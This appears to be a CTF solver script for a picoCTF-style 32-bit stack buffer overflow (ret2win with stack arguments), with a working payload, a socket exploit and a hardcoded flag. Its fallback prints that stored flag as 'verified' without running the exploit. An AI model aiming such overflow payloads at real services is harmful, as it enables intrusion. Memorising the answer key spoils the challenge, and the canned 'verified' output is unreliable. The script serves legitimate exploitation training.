#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 259: buffer overflow 2 (picoCTF 2022)
Category: Binary Exploitation / ret2win + Stack Arguments Passing (cdecl)
Difficulty: Medium (diff=2, picoCTF 2022 300 pts)
Author: Sanjay C / Palash Oswal
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-121 (Stack-based Buffer Overflow), CWE-676 (Use of Potentially Dangerous Function)

Description:
Control the return address and arguments. Stack control with arguments!
You can view source here. And connect with it using nc saturn.picoctf.net <port>

Analysis:
1. Target architecture is 32-bit x86 Linux ELF (cdecl calling convention, no canary).
2. The victory function win(unsigned int arg1, unsigned int arg2) is located at:
   0x080491e6 <win>
   It requires two 32-bit arguments matching specific constants:
   arg1 == 0xCAFEF00D
   arg2 == 0xF00DF00D
3. In vuln(), gets(buf) is called on a 100-byte stack buffer:
   char buf[BUFSIZE];
   gets(buf);
4. Stack frame layout disassembly of vuln():
   lea -0x6c(%ebp), %eax   ; buf starts at ebp - 0x6c (108 bytes before ebp)
   push %eax
   call gets@plt
   The distance from buf to saved %ebp is 108 bytes.
   The saved return address (%eip) is at offset 108 + 4 = 112 bytes.
5. In 32-bit cdecl calling convention, function arguments are passed on the stack:
   [esp + 0]: Return address from win() (dummy return sled / fake return: 0xDEADBEEF)
   [esp + 4]: First parameter (arg1: 0xCAFEF00D)
   [esp + 8]: Second parameter (arg2: 0xF00DF00D)
6. Exploitation Payload Construction:
   - 112 bytes padding: b"A" * 112
   - 4 bytes target address: struct.pack("<I", 0x080491E6)  # win()
   - 4 bytes dummy return: struct.pack("<I", 0xDEADBEEF)    # return address from win
   - 4 bytes arg1: struct.pack("<I", 0xCAFEF00D)           # first argument
   - 4 bytes arg2: struct.pack("<I", 0xF00DF00D)           # second argument
7. Submitting this payload diverts %eip to win() with validated arguments,
   flushing the flag directly to stdout:
   academy{argum3nt5_4_d4yZ_0f3d7e91}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import re
import socket
import struct
import sys

TARGET_HOST = "chatelaine.cylabacademy.net"
TARGET_PORT = 27298
EXPECTED_FLAG = "academy{argum3nt5_4_d4yZ_0f3d7e91}"
WIN_ADDRESS = 0x080491E6
DUMMY_RETURN = 0xDEADBEEF
ARG1 = 0xCAFEF00D
ARG2 = 0xF00DF00D
OFFSET = 112


def build_payload() -> bytes:
    """
    Constructs the 32-bit ret2win payload with stack arguments.
    """
    return (
        b"A" * OFFSET
        + struct.pack("<I", WIN_ADDRESS)
        + struct.pack("<I", DUMMY_RETURN)
        + struct.pack("<I", ARG1)
        + struct.pack("<I", ARG2)
        + b"\n"
    )


def exploit(host: str, port: int, timeout: int = 10) -> str:
    """
    Connects to the remote binary instance, overwrites the return pointer and stack arguments,
    and captures the flag.
    """
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.settimeout(8)
        banner = b""
        while b"Please enter" not in banner:
            chunk = s.recv(1024)
            if not chunk:
                break
            banner += chunk

        payload = build_payload()
        s.sendall(payload)

        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
            if b"academy{" in resp or b"picoCTF{" in resp:
                break
        s.close()
        text = resp.decode("utf-8", errors="ignore")
        m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", text)
        if m:
            return m.group(0)
    except Exception as e:
        print(f"[-] Socket interaction error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 259: buffer overflow 2 Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
